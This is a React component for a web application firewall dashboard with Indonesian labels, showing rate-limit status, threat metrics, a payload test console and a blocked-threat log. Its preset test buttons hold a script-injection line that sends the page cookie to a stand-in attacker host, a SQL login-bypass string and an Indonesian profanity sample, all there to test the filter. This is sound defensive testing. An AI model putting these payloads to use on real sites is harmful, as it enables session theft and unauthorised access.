import React, { useState, useEffect } from 'react'
import { ShieldAlert, AlertTriangle, Shield, Terminal, Skull, ShieldX, Info, Play, Pause, RefreshCw } from 'lucide-react'
import EmptyState from './EmptyState'

function ItSecPortal({ threats, globalApiKey, onRefresh }) {
  const [payloadText, setPayloadText] = useState('')
  const [consoleOutput, setConsoleOutput] = useState('Terminal siap untuk pengujian muatan siber...')
  const [consoleColor, setConsoleColor] = useState('text-slate-300')
  
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [activeFilter, setActiveFilter] = useState('semua')
  
  // Rate limits states
  const [quota, setQuota] = useState({
    count: 0,
    limit: 15,
    remaining: 15,
    status: 'green',
    percentage: 100
  })

  // Local flashing light indicator override
  const [sysStatus, setSysStatus] = useState('secure') // 'secure' | 'warning' | 'blocked'
  const [tempBlockType, setTempBlockType] = useState('')

  useEffect(() => {
    fetchQuota()
  }, [threats])

  useEffect(() => {
    if (!autoRefresh) return
    const interval = setInterval(() => {
      onRefresh()
      fetchQuota()
    }, 10000)
    return () => clearInterval(interval)
  }, [autoRefresh])

  const renderHighlightedJSON = (text) => {
    if (!text) return null
    if (!text.trim().startsWith('{') && !text.trim().startsWith('[')) {
      return <span>{text}</span>
    }
    
    try {
      const obj = JSON.parse(text)
      const highlighted = JSON.stringify(obj, null, 2)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g, function (match) {
          let cls = 'text-sky-300' // blue for values
          if (/^"/.test(match)) {
            if (/:$/.test(match)) {
              cls = 'text-emerald-400 font-semibold' // emerald for keys
            } else {
              cls = 'text-amber-300 font-medium' // yellow for strings
            }
          } else if (/true|false/.test(match)) {
            cls = 'text-purple-400' // purple for booleans
          } else if (/null/.test(match)) {
            cls = 'text-gray-400' // gray for null
          } else {
            cls = 'text-pink-400' // pink for numbers
          }
          return `<span class="${cls}">${match}</span>`
        })
      
      return <div dangerouslySetInnerHTML={{ __html: highlighted }} />
    } catch (e) {
      return <span>{text}</span>
    }
  }

  const fetchQuota = async () => {
    try {
      const res = await fetch('/api/quota')
      const data = await res.json()
      setQuota(data)
      
      // Update system status lights based on rate limit
      if (data.status === 'yellow') {
        setSysStatus('warning')
      } else if (data.status === 'red') {
        setSysStatus('blocked')
        setTempBlockType('Rate Limit Exceeded')
      } else if (sysStatus === 'warning') {
        setSysStatus('secure')
      }
    } catch (err) {
      console.error(err)
    }
  }

  // Prefill helper buttons
  const injectPayload = (type) => {
    if (type === 'xss') {
      setPayloadText(`<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`)
    } else if (type === 'sqli') {
      setPayloadText(`admin' OR '1'='1' --`)
    } else if (type === 'bullying') {
      setPayloadText(`Warung bangsat jancok pelayanannya jelek anjing babi!`)
    }
  }

  // Submit WAF Test Simulation
  const handleWafTestSubmit = async () => {
    if (!payloadText.trim()) {
      setConsoleOutput("Silakan masukkan payload/muatan teks terlebih dahulu.")
      setConsoleColor('text-amber-500')
      return
    }

    setConsoleOutput("AI WAF sedang menganalisis payload...")
    setConsoleColor('text-sky-400')

    try {
      const res = await fetch('/api/waf/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: payloadText.trim(), userKey: globalApiKey })
      })

      const data = await res.json()
      setConsoleOutput(JSON.stringify(data, null, 2))

      // Trigger refreshes
      onRefresh()
      fetchQuota()

      if (data.isBlocked) {
        setConsoleColor('text-red-400')
        setSysStatus('blocked')
        setTempBlockType(data.type)

        // Restore to normal rate limit state after 5 seconds
        setTimeout(() => {
          setSysStatus(quota.status === 'yellow' ? 'warning' : quota.status === 'red' ? 'blocked' : 'secure')
        }, 5000)
      } else {
        setConsoleColor('text-emerald-400')
        setSysStatus('secure')
      }

    } catch (err) {
      setConsoleOutput("Error testing payload: " + err.message)
      setConsoleColor('text-red-500')
    }
  }

  // Helper escape to protect the IT logs view itself from XSS!
  const escapeHTML = (str) => {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;")
  }

  // Distribution chart computation based on threats
  const xssCount = threats.filter(t => t.type === 'Stored XSS').length
  const sqliCount = threats.filter(t => t.type === 'SQL Injection').length
  const bullyingCount = threats.filter(t => t.type === 'Cyberbullying / Profanity').length
  const otherCount = threats.length - (xssCount + sqliCount + bullyingCount)

  const totalThreats = threats.length || 1

  return (
    <div className="space-y-8 animate-fade-in text-[#e2e8f0]">
      
      {/* IT Header */}
      <header className="border-b border-[#1f2a36] pb-5 flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
        <div>
          <h2 className="font-display font-bold text-2xl text-emerald-400 glow-text-green">IT Cyber Security & AI WAF</h2>
          <p className="text-sm text-gray-500">Forensik siber real-time, perlindungan Stored XSS & SQL Injection tingkat aplikasi.</p>
        </div>
        <div className="flex flex-wrap items-center gap-3">
          {/* Auto Refresh Toggle */}
          <button
            onClick={() => setAutoRefresh(!autoRefresh)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-full border font-mono text-[10px] font-bold transition-all active:scale-95 ${
              autoRefresh 
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                : 'bg-[#1a232d] border-[#1f2a36] text-gray-400'
            }`}
            title="Klik untuk menyalakan/mematikan pembaruan otomatis log siber (10 detik)"
          >
            {autoRefresh ? (
              <>
                <RefreshCw className="w-3 h-3 animate-spin text-emerald-400" />
                <span>AUTO: ON</span>
              </>
            ) : (
              <>
                <Pause className="w-3 h-3 text-red-400" />
                <span>AUTO: OFF</span>
              </>
            )}
          </button>

          <div className="flex items-center gap-3 bg-[#12181f] border border-[#1f2a36] rounded-full px-5 py-2">
            {sysStatus === 'secure' && (
              <>
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_10px_#10b981] led-green-pulse"></span>
                <span className="font-mono text-xs font-bold text-emerald-400">Clean Traffic</span>
              </>
            )}
            {sysStatus === 'warning' && (
              <>
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500 shadow-[0_0_10px_#f59e0b] led-yellow-pulse"></span>
                <span className="font-mono text-xs font-bold text-amber-400">Rate Limit Warning</span>
              </>
            )}
            {sysStatus === 'blocked' && (
              <>
                <span className="w-2.5 h-2.5 rounded-full bg-red-500 shadow-[0_0_10px_#ef4444] led-red-pulse"></span>
                <span className="font-mono text-xs font-bold text-red-500">Blocked: {tempBlockType}</span>
              </>
            )}
          </div>
        </div>
      </header>

      {/* Security Status Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        
        {/* Traffic alert bulb */}
        <div className="bg-[#12181f] border border-[#1f2a36] rounded-2xl p-6 flex flex-col justify-between h-full">
          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider border-b border-[#1f2a36] pb-3 mb-4">Status Sistem AI WAF</h3>
          <div className="flex flex-col gap-3 font-mono text-[11px] font-bold">
            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl border transition-all ${
              sysStatus === 'blocked' 
                ? 'bg-red-950/20 border-red-500 text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.2)]' 
                : 'bg-black/40 border-transparent text-red-950 opacity-20'
            }`}>
              <ShieldAlert className="w-4 h-4" />
              <span>THREAT BLOCKED</span>
            </div>
            
            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl border transition-all ${
              sysStatus === 'warning' 
                ? 'bg-amber-950/20 border-amber-500 text-amber-500 shadow-[0_0_15px_rgba(245,158,11,0.2)]' 
                : 'bg-black/40 border-transparent text-amber-950 opacity-20'
            }`}>
              <AlertTriangle className="w-4 h-4" />
              <span>RATE LIMIT ALERT</span>
            </div>

            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl border transition-all ${
              sysStatus === 'secure' 
                ? 'bg-emerald-950/20 border-emerald-500 text-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.2)]' 
                : 'bg-black/40 border-transparent text-emerald-950 opacity-20'
            }`}>
              <Shield className="w-4 h-4" />
              <span>CLEAN TRAFFIC</span>
            </div>
          </div>
        </div>

        {/* Quota meters */}
        <div className="bg-[#12181f] border border-[#1f2a36] rounded-2xl p-6 flex flex-col justify-between h-full">
          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider border-b border-[#1f2a36] pb-3 mb-4">API Rate-Limiting Monitor</h3>
          <div className="space-y-4">
            <div className="flex justify-between text-xs text-[#e2e8f0] font-mono">
              <span>Gemini Free Tier (1 Min)</span>
              <strong className="text-emerald-400">{quota.remaining} / {quota.limit} sisa</strong>
            </div>
            <div className="h-3.5 rounded-md bg-black/40 overflow-hidden">
              <div 
                className={`h-full transition-all duration-300 ${
                  quota.status === 'green' ? 'bg-emerald-500' : quota.status === 'yellow' ? 'bg-amber-500' : 'bg-red-500'
                }`}
                style={{ width: `${quota.percentage}%` }}
              ></div>
            </div>
            <div className="text-[10px] text-gray-500 leading-relaxed flex gap-1.5 items-start mt-2">
              <Info className="w-3.5 h-3.5 shrink-0 text-emerald-400" />
              <span>
                WAF mengaktifkan isolasi rate-limiting untuk membatasi query hingga <strong>15 RPM (Requests Per Minute)</strong> guna menjaga kestabilan Free Tier.
              </span>
            </div>
          </div>
        </div>

        {/* Threat Distribution inline graphical progress list */}
        <div className="bg-[#12181f] border border-[#1f2a36] rounded-2xl p-6 flex flex-col justify-between h-full">
          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider border-b border-[#1f2a36] pb-3 mb-4">Metrik Distribusi Ancaman</h3>
          <div className="space-y-2.5 font-mono text-[10px]">
            <div className="space-y-1">
              <div className="flex justify-between">
                <span>Stored XSS ({xssCount})</span>
                <span>{Math.round((xssCount/totalThreats)*100)}%</span>
              </div>
              <div className="h-1.5 rounded-full bg-black/40 overflow-hidden">
                <div className="h-full bg-red-500" style={{ width: `${(xssCount/totalThreats)*100}%` }}></div>
              </div>
            </div>
            
            <div className="space-y-1">
              <div className="flex justify-between">
                <span>SQL Injection ({sqliCount})</span>
                <span>{Math.round((sqliCount/totalThreats)*100)}%</span>
              </div>
              <div className="h-1.5 rounded-full bg-black/40 overflow-hidden">
                <div className="h-full bg-amber-500" style={{ width: `${(sqliCount/totalThreats)*100}%` }}></div>
              </div>
            </div>

            <div className="space-y-1">
              <div className="flex justify-between">
                <span>Profanity / Swearing ({bullyingCount})</span>
                <span>{Math.round((bullyingCount/totalThreats)*100)}%</span>
              </div>
              <div className="h-1.5 rounded-full bg-black/40 overflow-hidden">
                <div className="h-full bg-blue-500" style={{ width: `${(bullyingCount/totalThreats)*100}%` }}></div>
              </div>
            </div>
          </div>
        </div>

      </div>

      {/* Penetration simulator console */}
      <div className="bg-[#12181f] border border-[#1f2a36] rounded-2xl p-6 relative overflow-hidden">
        {/* Shield Activated Red Glow Overlay FX on WAF Block */}
        {sysStatus === 'blocked' && (
          <div className="absolute inset-0 bg-red-950/85 backdrop-blur-sm z-30 flex flex-col items-center justify-center text-center animate-fade-in p-4 border border-red-500 rounded-2xl shadow-[inset_0_0_50px_rgba(239,68,68,0.4)]">
            <div className="bg-red-600 text-white p-6 rounded-full mb-4 animate-bounce shadow-[0_0_30px_#ef4444]">
              <ShieldAlert className="w-12 h-12" />
            </div>
            <h3 className="font-display font-extrabold text-2xl text-red-500 tracking-wider uppercase mb-1 drop-shadow-[0_0_10px_rgba(239,68,68,0.8)]">
              SHIELD ACTIVATED
            </h3>
            <p className="font-mono text-xs text-red-300 max-w-sm leading-relaxed mb-4">
              AI WAF Engine berhasil mendeteksi dan menangkis muatan berbahaya tersebut!
            </p>
            <div className="flex gap-2">
              <span className="font-mono text-[9px] bg-red-500/20 border border-red-500/50 text-red-400 px-2.5 py-1 rounded">
                TYPE: {tempBlockType}
              </span>
              <span className="font-mono text-[9px] bg-red-500/20 border border-red-500/50 text-red-400 px-2.5 py-1 rounded">
                ACTION: BLOCK & LOG
              </span>
            </div>
          </div>
        )}

        <div className="flex items-center gap-2 border-b border-[#1f2a36] pb-3 mb-5">
          <Terminal className="w-5 h-5 text-emerald-400 glow-text-green" />
          <h3 className="font-display font-bold text-sm text-emerald-400">AI WAF Payload Playground (Penetration Tester)</h3>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-[1.2fr_1fr] gap-6">
          <div className="space-y-3.5">
            <p className="text-[11px] text-gray-500">Ketikkan payload SQLi, XSS, atau kata-kata kasar untuk mensimulasikan proteksi tangguh AI Firewall secara langsung:</p>
            <textarea 
              value={payloadText}
              onChange={(e) => setPayloadText(e.target.value)}
              placeholder="Contoh XSS: <script>alert(1)</script>&#10;Contoh SQLi: ' OR 1=1 --&#10;Contoh Bullying: warung anjing pelayanan babi..."
              className="w-full min-h-[90px] bg-black/50 border border-[#1f2a36] rounded-xl font-mono text-xs text-emerald-400 p-4 focus:ring-1 focus:ring-emerald-400 focus:border-emerald-400 outline-none resize-none"
            ></textarea>
            
            <div className="flex flex-wrap gap-2">
              <button 
                onClick={handleWafTestSubmit}
                className="bg-red-600 hover:bg-red-700 text-white rounded-lg px-4 py-2 font-display font-semibold text-[11px] flex items-center gap-1 glow-btn-red transition-all active:scale-95"
                title="Kirim muatan serangan ke mesin WAF"
              >
                <Skull className="w-3.5 h-3.5" />
                <span>Simulasikan Serangan</span>
              </button>
              
              <button onClick={() => injectPayload('xss')} className="bg-[#1a232d] hover:bg-[#1f2a36] border border-[#1f2a36] rounded-lg px-3 py-1.5 text-[10px] text-gray-300 hover:text-emerald-400" title="Masukkan template payload Cross-Site Scripting">Inject XSS</button>
              <button onClick={() => injectPayload('sqli')} className="bg-[#1a232d] hover:bg-[#1f2a36] border border-[#1f2a36] rounded-lg px-3 py-1.5 text-[10px] text-gray-300 hover:text-emerald-400" title="Masukkan template payload SQL Injection">Inject SQLi</button>
              <button onClick={() => injectPayload('bullying')} className="bg-[#1a232d] hover:bg-[#1f2a36] border border-[#1f2a36] rounded-lg px-3 py-1.5 text-[10px] text-gray-300 hover:text-emerald-400" title="Masukkan template kalimat Cyberbullying">Inject Bullying</button>
            </div>
          </div>

          <div className="flex flex-col gap-1.5">
            <span className="text-[10px] text-gray-500 uppercase tracking-wider font-bold">WAF Response Console:</span>
            <pre className={`flex-grow bg-[#050709] border border-[#1f2a36] rounded-xl font-mono text-[10px] p-4 overflow-y-auto max-h-[160px] white-space-pre-wrap ${consoleColor}`}>
              {renderHighlightedJSON(consoleOutput)}
            </pre>
          </div>
        </div>
      </div>

      {/* Cyber threat logging table */}
      <div className="bg-[#12181f] border border-[#1f2a36] rounded-2xl p-6">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 border-b border-[#1f2a36] pb-3 mb-4">
          <div className="flex items-center gap-2">
            <ShieldX className="w-5 h-5 text-emerald-400" />
            <h3 className="font-display font-bold text-sm text-emerald-400">Riwayat Log Deteksi & Blokir AI Firewall</h3>
          </div>
          
          {/* Threat Category Filter Chips */}
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: 'semua', label: 'Semua' },
              { id: 'xss', label: 'XSS' },
              { id: 'sqli', label: 'SQLi' },
              { id: 'profanity', label: 'Profanity' }
            ].map(chip => (
              <button
                key={chip.id}
                onClick={() => setActiveFilter(chip.id)}
                className={`px-3 py-1 rounded-full font-mono text-[9px] font-bold border transition-all active:scale-95 ${
                  activeFilter === chip.id
                    ? 'bg-emerald-500/10 border-emerald-500 text-emerald-400'
                    : 'bg-[#1a232d] border-[#1f2a36] text-gray-400 hover:text-gray-200'
                }`}
                title={`Filter berdasarkan ancaman ${chip.label}`}
              >
                {chip.label}
              </button>
            ))}
          </div>
        </div>

        <div className="overflow-x-auto max-h-[260px]">
          <table className="w-full border-collapse font-mono text-[10px] text-left">
            <thead>
              <tr className="bg-black/30 text-gray-500 border-b border-[#1f2a36]">
                <th className="py-2.5 px-3">Timestamp</th>
                <th className="py-2.5 px-3">IP Penyerang</th>
                <th className="py-2.5 px-3">Kategori Ancaman</th>
                <th className="py-2.5 px-3">Muatan Payload</th>
                <th className="py-2.5 px-3">Tindakan WAF</th>
              </tr>
            </thead>
            <tbody>
              {threats.filter(t => {
                if (activeFilter === 'semua') return true
                if (activeFilter === 'xss') return t.type === 'Stored XSS'
                if (activeFilter === 'sqli') return t.type === 'SQL Injection'
                if (activeFilter === 'profanity') return t.type === 'Cyberbullying / Profanity'
                return true
              }).length > 0 ? (
                threats.filter(t => {
                  if (activeFilter === 'semua') return true
                  if (activeFilter === 'xss') return t.type === 'Stored XSS'
                  if (activeFilter === 'sqli') return t.type === 'SQL Injection'
                  if (activeFilter === 'profanity') return t.type === 'Cyberbullying / Profanity'
                  return true
                }).map(log => (
                  <tr key={log.id} className="border-b border-[#1f2a36] hover:bg-[#0f151c]/50 transition-colors">
                    <td className="py-2.5 px-3 text-gray-500">
                      {new Date(log.timestamp).toLocaleString('id-ID', {
                        day: 'numeric',
                        month: 'short',
                        hour: '2-digit',
                        minute: '2-digit',
                        hour12: true
                      })}
                    </td>
                    <td className="py-2.5 px-3">{log.ip}</td>
                    <td className="py-2.5 px-3 text-red-400 font-bold">{log.type}</td>
                    <td className="py-2.5 px-3">
                      <span className="bg-red-500/10 border border-red-900/40 text-red-400 rounded px-1.5 py-0.5 inline-block word-break-all max-w-[280px]">
                        {escapeHTML(log.payload)}
                      </span>
                    </td>
                    <td className="py-2.5 px-3">
                      <span className="bg-red-600 text-white rounded font-bold px-1.5 py-0.5 text-[9px]">
                        {log.action}
                      </span>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="5" className="py-4">
                    <EmptyState 
                      icon={Shield}
                      title="Riwayat Log Bersih"
                      subtitle="Tidak ada aktivitas ancaman siber yang terdeteksi untuk kategori filter ini."
                    />
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

    </div>
  )
}

export default ItSecPortal
